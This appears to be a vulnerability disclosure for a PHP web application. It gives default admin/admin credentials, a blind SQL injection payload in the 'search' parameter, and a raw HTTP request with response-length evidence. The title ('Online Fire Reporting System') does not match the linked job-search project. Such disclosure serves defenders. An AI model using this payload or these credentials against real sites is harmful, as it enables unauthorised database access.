# Online Fire Reporting System v1.0  has SQL injection

The password for the backend login account is: admin/admin

vendors: https://www.campcodes.com/projects/php/online-job-search-system-using-php-mysql-free-download/

Vulnerability File: /eris/index.php?q=viewjob&search=

Vulnerability location: /eris/index.php?q=viewjob&search=, search

Current database name: erisdb ,length is 6

[+] Payload: /eris/index.php?q=viewjob&search=1%27%20and%20length(database())=6--+ // Leak place ---> search

```sql
GET /eris/index.php?q=viewjob&search=1%27%20and%20length(database())=6--+ HTTP/1.1
Host: 192.168.1.19
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
DNT: 1
Cookie: PHPSESSID=mho0fs263l0tis8l6v3lqpu6q4
Connection: close
```

When length (database ()) = 5, Content-Length: 16795
![image](https://user-images.githubusercontent.com/54017627/170848952-3d0644ef-9b6d-4cc2-9432-13ce49e9cb83.png)

![image](https://user-images.githubusercontent.com/54017627/170848965-ddcb02d2-99b8-4a11-8ba7-515234095973.png)

When length (database ()) = 6, Content-Length: 20558
![image](https://user-images.githubusercontent.com/54017627/170848949-ee172cda-db44-4b6a-bae2-87bc20548121.png)

![image](https://user-images.githubusercontent.com/54017627/170848957-b26f6391-8150-4cc4-960a-24c95b4bf1c9.png)
